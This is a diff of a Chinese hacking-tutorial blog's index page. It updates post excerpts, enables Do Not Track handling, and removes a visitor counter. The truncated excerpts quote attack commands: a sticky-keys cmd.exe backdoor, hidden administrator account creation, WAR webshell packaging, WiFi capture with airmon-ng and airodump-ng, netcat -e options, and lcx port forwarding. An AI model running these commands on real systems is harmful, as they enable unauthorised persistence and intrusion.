@@ -60,7 +60,7 @@
   <script id="fluid-configs">
     var Fluid = window.Fluid || {};
     Fluid.ctx = Object.assign({}, Fluid.ctx)
-    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":false,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
 
     if (CONFIG.web_analytics.follow_dnt) {
       var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
@@ -246,7 +246,7 @@
       
       <a class="index-excerpt index-excerpt__noimg" href="/2020/01/13/%E5%88%B6%E4%BD%9Cwar%E6%9C%A8%E9%A9%AC%E5%B9%B6%E4%B8%94%E6%8B%BF%E4%B8%8Bwebshell/" target="_self">
         <div>
-          0x01 前言今天用弱口令扫描工具找到一个后台，发现有war格式的上传点，尝试拿一下webshell。首先我们制作一个war木马…  0x02 制作war木马 安装JDK 准备一个jsp一句话木马 将木马放到JDK&#x2F;bin下，比如：C:\Program Files\Java\jdk1.8.0_131\bin  cmd[管理员模式]进入JDK&#x2F;bin目录，运行” jar cvf
+          0、简介发现后台有war上传点，尝试拿一下webshell。  1、制作war木马 安装JDK jsp一句话木马 木马放到JDK&#x2F;bin目录，比如：C:\Program Files\Java\jdk1.8.0_131\bin  [管理员模式]cmd进入JDK&#x2F;bin目录，运行jar cvf shell.war xx.jsp，生成shell.war文件。     2、getshe
         </div>
       </a>
 
@@ -307,7 +307,7 @@
       
       <a class="index-excerpt index-excerpt__noimg" href="/2019/12/06/%E5%88%B6%E4%BD%9CShift%E5%90%8E%E9%97%A8/" target="_self">
         <div>
-          cmd命令123456# 连按5次shift键,可调出后门# 运行explorer.exe可以进入桌面,权限是SYSTEM# 使用管理员权限运行cmdcopy C:\windows\system32\cmd.exe C:\windows\system32\sethc.exe
+          1、cmd命令连按5次shift键,可调出后门。运行explorer.exe可以进入桌面,权限是SYSTEM。 12# 使用管理员权限运行cmdcopy C:\windows\system32\cmd.exe C:\windows\system32\sethc.exe
         </div>
       </a>
 
@@ -368,7 +368,7 @@
       
       <a class="index-excerpt index-excerpt__noimg" href="/2019/12/06/win%E6%B7%BB%E5%8A%A0%E9%9A%90%E8%97%8F%E7%94%A8%E6%88%B7/" target="_self">
         <div>
-          0x01 前言提权成功后，维持权限可以添加隐藏账户。 0x02 命令行隐藏123# 创建用户时使用$符号,这样添加的用户,命令行不会显示net user hacker$ password /addnet localgroup administrators hacker$ /add    在计算机管理—&gt;本地用户和组中，还是可以看到刚创建的用户   0x03 注册表隐藏 更改 HKEY_LOC
+          0、简介提权成功后，维持权限可以添加隐藏账户。 1、命令行隐藏123# 创建用户时使用$符号,这样添加的用户,命令行不会显示net user hacker$ password /addnet localgroup administrators hacker$ /add    在计算机管理—&gt;本地用户和组中，还是可以看到刚创建的用户   2、注册表隐藏 更改 HKEY_LOCAL_MACHIN
         </div>
       </a>
 
@@ -429,7 +429,7 @@
       
       <a class="index-excerpt index-excerpt__noimg" href="/2019/11/28/%E7%A0%B4%E8%A7%A3wifi%E5%AF%86%E7%A0%81/" target="_self">
         <div>
-          0x01 命令12345678# 查看网卡信息iwconfig# 结束可能会影响网卡监听的进程airmon-ng check kill# 网卡设置为监听模式，完成后wlan0会变成wlan0monairmon-ng start wlan0# 探测附件WiFi信息airodump-ng wlan0mon   0x02 抓取连接时的数据包1234567airodump-ng wlan0mon -c 8
+          1、设置无线网卡12345678# 查看网卡信息iwconfig# 结束可能会影响网卡监听的进程airmon-ng check kill# 网卡设置为监听模式，完成后wlan0会变成wlan0monairmon-ng start wlan0# 探测附件WiFi信息airodump-ng wlan0mon   2、抓取数据包抓取连接成功的数据包，用来解密wifi密码。 12# airodump-ng
         </div>
       </a>
 
@@ -490,7 +490,7 @@
       
       <a class="index-excerpt index-excerpt__noimg" href="/2019/11/18/nc%E5%8F%8D%E5%BC%B9shell/" target="_self">
         <div>
-          0x01 简介nc被誉为网络中的瑞士军刀,nc的用途和使用方法多种多样。 0x02 参数123456789101112131415-h  查看帮助信息   -d  后台模式   -e  prog程序重定向，一但连接就执行［危险］  -i  secs延时的间隔  -l  监听模式，用于入站连接   -L  监听模式，连接天闭后仍然继续监听，直到CTR+C   -n  IP地址，不能用域名   -o
+          0、简介nc被誉为网络中的瑞士军刀,nc的用途和使用方法多种多样。 参数： 123456789101112131415-h  查看帮助信息   -d  后台模式   -e  prog程序重定向，一但连接就执行［危险］  -i  secs延时的间隔  -l  监听模式，用于入站连接   -L  监听模式，连接天闭后仍然继续监听，直到CTR+C   -n  IP地址，不能用域名   -o  film记
         </div>
       </a>
 
@@ -551,7 +551,7 @@
       
       <a class="index-excerpt index-excerpt__noimg" href="/2019/11/18/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/" target="_self">
         <div>
-          0x01 简介偶尔会遇到，拿下了webshell. 远程端口是开启的，但是远程不了，这可能遇到了部署在内网的服务器，终端端口没有映射到公网。这时我们就需要进行内网端口转发， 进而扩大成果。前提是需要一台公网主机，用来监听端口 。  0x02 lcx使用方法首先用公网主机监听 9999 端口，等待接收数据，接收到数据之后把接收到的数据转发到公网主机的 1234 端口。 1234# vps监听 999
+          0、简介偶尔会遇到，拿下了webshell. 远程端口是开启的，但是远程不了，这可能遇到了部署在内网的服务器，终端端口没有映射到公网。这时我们就需要进行内网端口转发， 进而扩大成果。前提是需要一台公网主机，用来监听端口 。  1、lcx 使用方法首先用公网主机监听 9999 端口，等待接收数据，接收到数据之后把接收到的数据转发到公网主机的 1234 端口。 1234# vps监听 9999 端口，
         </div>
       </a>
 
@@ -575,7 +575,7 @@
     
       <span class="category-chain">
         
-  <a href="/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/" class="category-chain-item">工具使用</a>
+  <a href="/categories/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/" class="category-chain-item">端口转发</a>
   
   
 
@@ -656,30 +656,6 @@
     </div>
   
   
-    <div class="statistics">
-  
-  
-
-  
-    
-      <span id="busuanzi_container_site_pv" style="display: none">
-        总访问量 
-        <span id="busuanzi_value_site_pv"></span>
-         次
-      </span>
-    
-    
-      <span id="busuanzi_container_site_uv" style="display: none">
-        总访客数 
-        <span id="busuanzi_value_site_uv"></span>
-         人
-      </span>
-    
-    
-  
-</div>
-
-  
   
   
 </div>
@@ -732,8 +708,6 @@
 
 
   <script  src="/js/local-search.js" ></script>
-
-  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
 
 
 
